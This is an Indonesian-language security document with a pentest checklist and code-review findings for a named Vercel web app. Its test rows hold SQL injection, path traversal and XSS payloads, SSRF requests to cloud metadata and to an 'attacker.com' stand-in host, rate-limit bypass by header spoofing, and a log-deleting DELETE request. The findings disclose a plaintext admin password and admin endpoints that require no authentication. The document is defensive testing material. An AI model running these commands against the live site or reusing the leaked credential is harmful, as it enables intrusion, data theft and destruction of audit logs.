# SECURITY — web-scatter

> Domain produksi: `https://scatter-claim.vercel.app`
> Terakhir diperbarui: 2026-09-16

---

## 1. Ringkasan Arsitektur Proteksi

| Lapisan | Mekanisme | Implementasi |
|---|---|---|
| **Auth** | Google OAuth 2.0 (PKCE + state) | `lib/auth-handler.js` — state disimpan di cookie `oa_state`, code_verifier di `oa_verifier`, code_challenge = SHA256(verifier). Redirect URI dibangun dari `req.headers.origin`. |
| **Session** | JWT HMAC-SHA256 di cookie HttpOnly | Cookie `adm_session`; `HttpOnly; SameSite=Lax; Max-Age=43200` (TTL 12 jam). Signature dihitung dengan `SESSION_SECRET` env var. Payload: `{sub, email, name, iat, exp}`. |
| **Whitelist email** | `MASTER_EMAIL` + `settings.admin.allowed_emails[]` | Dicek saat callback OAuth. Cache per-email TTL 60 detik (`allowedCache` Map). |
| **Rate-limit** | In-memory per-IP, window 1 detik, max 20 req | `lib/rate-limit.js` — `globalRpsLimiter` (fixed-window). IP dari `X-Forwarded-For` (first value) → `req.connection.remoteAddress`. Prune bucket di atas 5000 entries. |
| **Security headers** | X-Content-Type-Options, X-Frame-Options, Referrer-Policy | `vercel.json` → `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`. |
| **Vercel config** | `cleanUrls: true`, `trailingSlash: false` | Menghilangkan `.html` extension dari URL. Rewrite `/master` → `/master/index.html`. |

**Catatan penting:** Hanya endpoint `/api/auth?action=login|me|logout` dan `/api/auth/callback` yang memiliki pengecekan session. **Seluruh endpoint lain (`/api/settings`, `/api/manage`, `/api/process`, `/api/admin/*`, `/api/submit`, `/api/auto`) TIDAK memiliki autentikasi** — mereka hanya dilindungi rate-limit global.

---

## 2. Pentest Plan — Checklist

### A. Endpoint Exposure

**Tujuan:** Memastikan semua endpoint publik teridentifikasi, tidak ada file tersembunyi, dan tidak ada informasi bocor lewat respons.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| A-01 | Enumerasi semua endpoint API via directory listing | `Invoke-WebRequest -Uri "https://scatter-claim.vercel.app/api/" -UseBasicParsing` | Tidak ada directory listing; response 403/404 | Directory listing tampil atau file indexer terlihat |
| A-02 | Akses file `.env` dan `.env.local` | `Invoke-WebRequest -Uri "https://scatter-claim.vercel.app/.env" -UseBasicParsing` | 404 Not Found | File `.env` atau `.env.local` bisa diunduh; isi secrets bocor |
| A-03 | Akses file `package.json`, `database.sql`, `migration_pipeline.sql` | `curl -s https://scatter-claim.vercel.app/package.json` | 404 atau redirects ke `/` | File bisa diunduh — dependency list bocor |
| A-04 | Enumerasi endpoint admin tanpa auth | `curl -s "https://scatter-claim.vercel.app/api/admin/claims"` | Data claims tampil tanpa auth | N/A — ini memang GAP (lihat temuan keamanan) |
| A-05 | Cek endpoint `/api/admin/logs` DELETE tanpa auth | `curl -s -X DELETE "https://scatter-claim.vercel.app/api/admin/logs"` | 401/403 | Logs terhapus → seluruh audit trail hilang |

---

### B. Auth & Session

**Tujuan:** Menguatkan mekanisme OAuth, PKCE, state validation, cookie, dan JWT integrity.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| B-01 | **State mismatch** — kirim callback dengan state berbeda dari cookie | `curl -s "https://scatter-claim.vercel.app/api/auth/callback?code=dummy&state=ATTACKER_STATE" -H "Cookie: oa_state=REAL_STATE"` | `{"ok":false,"message":"State mismatch - ulangi login"}` (403) | Login berhasil → CSRF login possible |
| B-02 | **PKCE tanpa verifier** — hapus cookie `oa_verifier`, kirim callback | Hapus cookie `oa_verifier` sebelum callback, isi `oa_state` dengan benar | Login gagal karena code_verifier tidak ditemukan | Login berhasil tanpa PKCE verifier |
| B-03 | **Cookie theft** — tes SameSite pada cookie `adm_session` | Inspect `Set-Cookie` header pada login response | `HttpOnly; SameSite=Lax; Path=/` ada | Cookie bisa diakses via JS (`HttpOnly` hilang) atau `SameSite=None` |
| B-04 | **Token expiry** — gunakan JWT yang sudah expired (12 jam) | Buat JWT dengan `exp` di masa lalu, kirim sebagai `adm_session` | `{"ok":true,"authenticated":false}` | Session dianggap valid |
| B-05 | **JWT signature bypass** — modifikasi payload tanpa re-sign | Decode JWT, ubah `email`, encode ulang tanpa ubah signature | `authenticated: false` | Email berubah → signature bypass |
| B-06 | **Brute-force SESSION_SECRET** | Coba beberapa secret umum jika default `'dev-session-secret'` digunakan di produksi | JWT verification gagal untuk semua guess | Salah satu secret berhasil verifikasi |

---

### C. Injection

**Tujuan:** Menguji input validation pada semua parameter yang masuk.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| C-01 | **Path traversal via `action` param** | `curl -s -X POST https://scatter-claim.vercel.app/api/process -H "Content-Type: application/json" -d '{"action":"../../etc/passwd"}'` | `{"ok":false,"message":"Invalid action"}` | Error path traversal atau file system akses |
| C-02 | **SQL injection pada `user_id`** | `curl -s "https://scatter-claim.vercel.app/api/track?user_id='+OR+1=1--"` | Error atau empty result (no SQL dump) | SQL error message muncul atau data bocor |
| C-03 | **SQL injection pada `kode_tiket` (submit)** | `curl -s -X POST https://scatter-claim.vercel.app/api/submit -H "Content-Type: application/json" -d '{"site":"test","user_id":"1","kode_tiket":"'\'' OR 1=1--","betting":1000,"scatter":3}'` | Validation error atau insert normal | SQL injection terjadi (error message SQL atau data salah) |
| C-04 | **NoSQL injection pada `search` param (manage)** | `curl -s "https://scatter-claim.vercel.app/api/manage?search[$gt]="` | Normal response atau error | Data ekstrasi atau query modifikasi |
| C-05 | **Header injection via `X-Forwarded-For`** | `curl -s -H "X-Forwarded-For: 1.1.1.1\r\nX-Injected: true" https://scatter-claim.vercel.app/api/track?user_id=test` | Normal response, header injection tidak berpengaruh | `X-Injected` header muncul di response |
| C-06 | **XSS pada `search` param** | `curl -s "https://scatter-claim.vercel.app/api/manage?search=<script>alert(1)</script>"` | Response JSON tanpa HTML rendering | Script tag dirender di browser |

---

### D. Rate-Limit & DDoS

**Tujuan:** Menguji ketahanan rate-limit in-memory terhadap bypass dan abuse.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| D-01 | **Rate-limit normal** — kirim >20 request dalam 1 detik | Loop PowerShell 30 request: `1..30 \| ForEach-Object { Invoke-WebRequest -Uri "https://scatter-claim.vercel.app/api/track?user_id=test" -UseBasicParsing }` | Request ke-21+ return HTTP 429 | Semua request berhasil tanpa 429 |
| D-02 | **Bypass via X-Forwarded-For** — kirim IP berbeda tiap request | FFK: `1..25 \| ForEach-Object { $ip = "10.$_.0.$_" ; Invoke-WebRequest -Uri "..." -Headers @{"X-Forwarded-For"="$ip"} }` | Tetap kena 429 karena rate-limit berdasarkan XFF pertama | Setiap IP baru mendapat fresh bucket (20 request ulang) |
| D-03 | **Bypass via rotation IP spoof** — gunakan banyak `X-Forwarded-For` values | `curl -H "X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3" ...` | IP yang digunakan tetap `1.1.1.1` (first value) | IP berganti ke `3.3.3.3` (last value) |
| D-04 | **Bucket exhaustion** — kirim request untuk trigger prune (>5000 keys) | Kirim 6000 request dari IP berbeda (via XFF spoofing berbeda) | Setelah 5000 keys, prune menghapus entry expired | Memory leak atau server crash |
| D-05 | **POST `/api/process` action=all batch abuse** | `curl -s -X POST https://scatter-claim.vercel.app/api/process -H "Content-Type: application/json" -d '{"action":"all"}'` | Rate-limit menghentikan, atau batch berhenti di 20 iterasi | Batch memproses >20 items tanpa batas waktu |

---

### E. SSRF (Server-Side Request Forgery)

**Tujuan:** Menguji apakah server bisa dipaksa melakukan request ke URL arbitrary.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| E-01 | **SSRF via `adminUrl` setting** — set adminUrl ke internal IP | `curl -s -X POST https://scatter-claim.vercel.app/api/settings -H "Content-Type: application/json" -d '{"key":"admin","value":{"adminUrl":"http://169.254.169.254/latest/meta-data/"}}'` | Error atau timeout; no metadata returned | AWS/GCP metadata bocor ke response |
| E-02 | **SSRF via `host` in history setting** | `curl -s -X POST https://scatter-claim.vercel.app/api/settings -H "Content-Type: application/json" -d '{"key":"history","value":{"host":"http://169.254.169.254/"}}'` | Error fetch | Server mengambil data dari internal metadata service |
| E-03 | **SSRF via pipeline auto** — trigger verifyClaimAuto dengan adminUrl pointing ke attacker | Set adminUrl ke `https://attacker.com/log`, lalu trigger auto tick | Server mengirim request ke attacker.com | Request ke attacker.com berhasil (attacker melihat log) |
| E-04 | **SSRF ke localhost** | `curl -s -X POST https://scatter-claim.vercel.app/api/settings -H "Content-Type: application/json" -d '{"key":"admin","value":{"adminUrl":"http://127.0.0.1:3000/"}}'` | Error atau timeout | Response dari localhost service bocor |
| E-05 | **Puppeteer SSRF** — gunakan `chromePath` untuk manipulasi | `curl -s -X POST https://scatter-claim.vercel.app/api/process -H "Content-Type: application/json" -d '{"action":"bonus_submit","id":"1","chromePath":"/etc/passwd"}'` | Error karena path invalid | Puppeteer mencoba membuka path non-Chrome |

---

### F. Secrets di Git / Environment

**Tujuan:** Memastikan tidak ada rahasia yang bocor ke repository atau environment publik.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| F-01 | **Cek `.env.example` berisi secrets** | Baca `.env.example` manual | Hanya placeholder atau dummy values | `.env.example` berisi password/keys aktual (contoh: `ADMIN_PASSWORD=Dasarpenjilatatasan123!`) |
| F-02 | **Cek git history untuk secrets** | `git log --all --oneline` → `git show HEAD:.env.local` | File `.env.local` tidak ada di git | Secrets ter-commit di git history |
| F-03 | **Cek `.gitignore` melindungi `.env*`** | Baca `.gitignore` | `.env` dan `.env.local` ada di `.gitignore` | Tidak ada proteksi terhadap `.env*` |
| F-04 | **Cek SESSION_SECRET default** | Baca `lib/auth-handler.js` line 12 | `SESSION_SECRET` di-set dari env var (bukan default) | Default `'dev-session-secret'` digunakan di produksi |
| F-05 | **Cek Supabase keys di `.env.example`** | Baca `.env.example` | Keys adalah placeholder `YOUR_KEY_HERE` | Real Supabase anon/service key tercantum |

---

### G. DoS via Puppeteer

**Tujuan:** Menguji apakah Puppeteer bisa disalahgunakan untuk denial-of-service.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| G-01 | **Trigger puppeteer browser launch berulang** | `curl -s -X POST https://scatter-claim.vercel.app/api/process -H "Content-Type: application/json" -d '{"action":"test_puppeteer"}'` (10x berturut) | Error atau browser tidak launch di serverless | Server crash atau memory leak |
| G-02 | **`bonus_submit` dengan invalid data** | `curl -s -X POST https://scatter-claim.vercel.app/api/process -H "Content-Type: application/json" -d '{"action":"bonus_submit","id":"nonexistent"}'` | Error graceful, tidak crash | Unhandled exception atau process hang |
| G-03 | **Timeout abuse pada puppeteer** | `curl -s -X POST https://scatter-claim.vercel.app/api/process -H "Content-Type: application/json" -d '{"action":"bonus_status","kode_tiket":"AAAA"}' --max-time 5` | Timeout di sisi client; server tidak hang | Vercel function timeout >10s |
| G-04 | **Concurrent puppeteer launch** | 5 request simultan ke `bonus_submit` | Rate-limit menghentikan sebagian | Semua 5 request launch browser → resource exhaustion |

---

### H. Misconfiguration Vercel

**Tujuan:** Memastikan konfigurasi Vercel tidak memiliki celah keamanan.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| H-01 | **Cek CORS wildcard** | Inspect `Access-Control-Origin` di semua endpoint | Semua endpoint: `Access-Control-Origin: *` (perlu di-restrict untuk produksi) | Ada endpoint yang tidak set CORS (ini juga gap) |
| H-02 | **Cek rewrites mengarah ke file exist** | `curl -s https://scatter-claim.vercel.app/master` | 200 OK, serves `master/index.html` | Rewrite mengarah ke path yang tidak ada atau exposed |
| H-03 | **Cek `cleanUrls` tidak expose file** | `curl -s https://scatter-claim.vercel.app/index.html` | Redirect atau 404 (karena cleanUrls) | File `index.html` bisa diakses langsung |
| H-04 | **Cek env vars tidak di-expose** | `curl -s https://scatter-claim.vercel.app/api/admin` | Response tidak berisi env vars | Environment variables bocor ke response |
| H-05 | **Cek function region & timeout** | `curl -sI https://scatter-claim.vercel.app/api/process` → inspect headers | Default Vercel headers | Non-standard region atau timeout bocor |

---

### I. Supply Chain

**Tujuan:** Memastikan dependensi aman dan tidak rentan.

| ID | Langkah Pengujian | Contoh Command | PASS Criteria | FAIL Criteria |
|---|---|---|---|---|
| I-01 | **Audit dependencies** | `npm audit --production` di root repo | 0 critical/high vulnerabilities | Critical vulnerability terdeteksi |
| I-02 | **Cek versi puppeteer-core** | Baca `package.json` | Versi terbaru (≥25.x) | Versi usang dengan CVE |
| I-03 | **Cek `node_modules` di `.gitignore`** | Baca `.gitignore` | `node_modules/` terdaftar | Dependencies ter-commit |
| I-04 | **Cek lock file integrity** | `npm ls --depth=0` | Semua dependency resolved | Missing or phantom dependency |
| I-05 | **Cek `@supabase/supabase-js` versi** | Baca `package.json` | Versi ≥2.45.0 | Versi lama dengan known vulnerability |

---

## 3. Temuan Keamanan Berprioritas (dari Pembacaan Kode)

### PRIORITAS 1 — Kritis: SSRF via `adminUrl` (tanpa validasi URL)

**Lokasi:** `lib/admin-api.js:151-153`, `api/settings/index.js:66-80`

`adminUrl` yang dikirim via POST `/api/settings` disimpan langsung ke Supabase dan digunakan oleh `fetchBetData()` untuk membuat server-side `fetch()`. **Tidak ada validasi whitelist domain** — attacker (atau siapa pun yang bisa POST ke `/api/settings`) bisa mengubah `adminUrl` ke URL internal (AWS metadata, localhost, attacker-controlled server) dan memicu SSRF.

```
// lib/admin-api.js:151
const domain = stored.adminUrl
  ? new URL(stored.adminUrl.startsWith('http') ? stored.adminUrl : `https://${stored.adminUrl}`).hostname
  : DEFAULT_DOMAIN;
```

**Dampak:** Exfiltrasi cloud metadata, akses ke service internal, pivot ke infrastruktur lain.

### PRIORITAS 2 — Kritis: Seluruh Endpoint Sensitif Tanpa Autentikasi

**Lokasi:** `api/settings/index.js`, `api/manage/index.js`, `api/process/index.js`, `api/admin/claims/index.js`, `api/admin/logs/index.js`, `api/admin/stats/index.js`

Tidak ada satu pun endpoint di atas yang memeriksa session JWT (`adm_session`) atau melakukan whitelist check. Hanya endpoint `/api/auth` yang memiliki guard auth. Akibatnya:

- Siapa saja bisa **membaca/mengubah settings** (termasuk token admin IDrBO).
- Siapa saja bisa **menghapus semua logs** (DELETE `/api/admin/logs`).
- Siapa saja bisa **memanipulasi status claims** dan memicu pipeline batch.
- Siapa saja bisa **membaca semua claims** via `/api/manage` atau `/api/admin/claims`.

**Dampak:** Privilege escalation total — setiap pengunjung website memiliki akses admin penuh.

### PRIORITAS 3 — Sedang: `.env.example` Berisi Secrets Aktual

**Lokasi:** `.env.example:3-4, 7`

File `.env.example` berisi values yang **bukan placeholder** melainkan credentials aktual:
- `SUPABASE_URL` dan `SUPABASE_ANON_KEY` dengan values real
- `ADMIN_PASSWORD=Dasarpenjilatatasan123!` — password admin plaintext
- `SUPABASE_SERVICE_KEY` dengan value identik ke anon key (indikasi key salah/sama)

Jika file ini ter-commit ke repository publik, seluruh credentials langsung exposed.

**Dampak:** Credential leakage, akses tak terautorisasi ke Supabase dan admin panel.
